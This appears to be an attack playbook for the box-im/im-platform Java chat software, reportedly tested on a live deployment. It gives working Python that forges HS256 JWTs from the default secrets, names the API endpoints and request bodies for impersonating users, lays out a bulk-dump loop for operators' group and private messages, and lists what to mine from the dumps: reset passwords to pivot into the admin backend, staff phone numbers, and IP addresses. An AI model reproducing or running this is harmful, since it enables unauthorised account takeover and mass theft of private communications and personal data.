# box-im / im-platform — default-JWT forgery to operator chat dump

Verified 2026-10 on a live multi-shard deployment (7 line domains). Applies to Java `box-im` / `im-platform` (source tree `im-platform/src/main/java`, clients `im-web` Vue3+Vant, `im-uniapp`).

## Fingerprint

- Hash route `#/conversation/<conversationId>/chat`; blank page when `/chat` is omitted.
- API family: `/api/user/self`, `/api/user/find/{id}`, `/api/friend/list`, `/api/group/list`, `/api/message/group/loadOfflineMessage`, `/api/message/private/loadOfflineMessage`.
- `application.yml` ships `jwt.accessToken.secret`, `jwt.refreshToken.secret`, MySQL/Redis/MinIO/TURN — defaults are frequently reused across the same operator's deployments.
- Universal error string: `系统繁忙` (also returned for wrong DTO shape, so it is not an auth verdict).

## Token forge (HS256)

```python
import jwt, json, time

def forge(secret, uid, nick="x"):
    info = json.dumps({"nickName": nick, "terminal": 1, "userId": uid, "userName": None},
                      ensure_ascii=False, separators=(',', ':'))
    return jwt.encode({"aud": str(uid), "exp": int(time.time()) + 86400, "info": info},
                      secret, algorithm="HS256")
```

Headers: `Authorization: Bearer <jwt>`; some builds also want a parallel `accessToken: <jwt>` (a bare Authorization answering 400 is the tell).

## Escalation order

1. `GET /api/user/self` — nickname / phone / last-login IP; proves which human this uid is.
2. `GET /api/friend/list`, `GET /api/group/list` — group IDs, owner, member counts.
3. `POST /api/message/group/loadOfflineMessage` body `{"groupId":<gid>,"minId":0}` — field names must match `GroupMessageHistoryDTO`; otherwise 系统繁忙.
4. `POST /api/message/private/loadOfflineMessage` body `{"friendId":<uid>,"minId":0}`.
5. uid inventory from the user-list API: `users_1_300.json` is a list `[id, type, nickName, ?, chatNo, banned]`; `type==5` = operator/staff. A dict-style parse yields `type==0` everywhere — false negative.
6. uid=1 returning 500 is a data anomaly, not an auth failure; try 4/5/6/8/9/11 etc.

## Bulk dump shape

- Per operator uid: `/api/user/self` → `/api/group/list` → loop groups `loadOfflineMessage` → write `im_ops/<uid>_groups.json` and `<uid>_offgroup.json`.
- Observed: single uid 13.7MB / 40,554 messages / 205 groups; ten uids > 60MB total.
- Always write to disk then read; do not trust terminal stdout for large JSON.

## What to mine (value order)

- **Default reset password** stated in an internal group (“默认重置密码了 <pw>”) — highest-value dictionary word for pivoting to the admin backend / RuoYi.
- Org chart: internal group names + owner uid + member counts (宣导内部群, 外招宣导群, 团队长群, 核心骨干群, 清算工作组).
- Pay/recruitment terms: daily wage, per-notification bonus, work-account vs life-account separation.
- New domains / APKs / meeting links / finance-client landing pages.
- Staff identity: `/api/user/self` nickname + phone + last IP (Dubai / Phnom Penh / UAE observed).

Regex starter: `(密码|口令|后台|管理|系统|搭建|源码|服务器|域名|https?://)`, then read context manually.

## Pitfalls

- Missing `info` → 401 / 系统繁忙; it is not a secret mismatch.
- Group-history calls with guessed fields all answer 系统繁忙; read `GroupMessageServiceImpl.loadHistoryMessage` for the exact DTO.
- Front-end conversation clicks may be swallowed by Vant overlays; navigate via hash, with `/chat`.
- Default secret already rotated on some deployments — verify with `/api/user/self` before scaling out.
